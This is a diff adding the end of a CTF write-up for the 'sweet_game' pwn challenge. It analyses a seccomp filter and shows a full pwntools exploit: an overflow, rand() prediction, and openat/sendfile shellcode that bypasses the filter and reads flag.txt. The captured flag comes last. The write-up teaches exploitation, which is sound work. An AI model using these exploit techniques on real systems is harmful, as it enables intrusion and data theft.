@@ -309,8 +309,130 @@ __int64 sub_150D()
 }
 ```
 
-Seems this is our goal because it would create a memory region with `rwx` permission then sets the first `0x1000` bytes to null and reads into the memory our input which is later on executes the value stored there
+Seems this is our goal because it would create a memory region with `rwx` permission then sets the first `0x1000` bytes to null and reads into the memory our input which it later on executes the value stored there
 
+So we would need to put shellcode in there so that it's going to be executed
+
+But before that it calls function `sub_1457`, let us take a look at it
+![image](https://github.com/user-attachments/assets/a66f83a7-7d86-43e7-8230-13ae412dad5e)
+
+```c
+__int64 sub_1457()
+{
+  __int64 v1; // [rsp+8h] [rbp-8h]
+
+  v1 = seccomp_init(0x7FFF0000LL);
+  if ( !v1 )
+    exit(0);
+  seccomp_rule_add(v1, 0LL, 2LL, 0LL);
+  seccomp_rule_add(v1, 0LL, 59LL, 0LL);
+  seccomp_rule_add(v1, 0LL, 322LL, 0LL);
+  seccomp_rule_add(v1, 0LL, 1LL, 0LL);
+  return seccomp_load(v1);
+}
+```
+
+Basically this initializes a seccomp rule that blocks syscall with sys_number as:
+- 0x2 -> open
+- 0x3b -> execve
+- 0x142 -> execveat
+- 0x1 -> write
+
+So we are not allowed to use those blacklisted syscalls
+
+Since we can't spawn a shell i decided to do orw shellcode
+
+Basically i'll open the flag, read the content and write the content
+
+Notice how it blocks `open & write` 
+
+That isn't a problem as there are other alternative to that
+
+In my case i went with:
+- openat
+- sendfile
+
+This is my final exploit
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from ctypes import CDLL
+from warnings import filterwarnings
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('sweet_game')
+context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
+
+filterwarnings("ignore")
+context.log_level = 'info'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+breakrva 0x1660
+breakrva 0x15B2
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+def init():
+    global io
+
+    io = start()
+
+
+def solve():
+
+    libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
+    code = "uyscuti"
+    io.sendlineafter(b"system:", b"A"*0xa + p32(0x0))
+    io.sendlineafter(b"proceed:", code.encode())
+    libc.srand(0)
+
+    for i in range(70):
+        valid = (libc.rand() + 8) % 20 + 1
+        io.sendlineafter(b"1 to 20:", str(valid).encode())
+
+
+    shellcode = shellcraft.linux.openat(-100, "flag.txt")
+    shellcode += shellcraft.linux.sendfile(1, 'rax', 0, 500)
+    
+    io.sendline(asm(shellcode))
+
+    io.interactive()
+
+
+def main():
+    
+    init()
+    solve()
+
+
+if __name__ == '__main__':
+    main()
+```
+
+Running it works!
+![image](https://github.com/user-attachments/assets/1b160b6d-28b0-4112-9288-43cf8ae0cee5)
+
+It also works on the remote instance
+![image](https://github.com/user-attachments/assets/209ad47f-209b-4ef8-9744-3115227d54d8)
+
+```
+Flag: battleCTF{TimeRand_hijack2Secc0mpF1!t3rBypass_3965657b94b0a5129710dc275f6d98e427be1aa1b83b448445e0329cf3f7e4e1}
+```
 
 
 
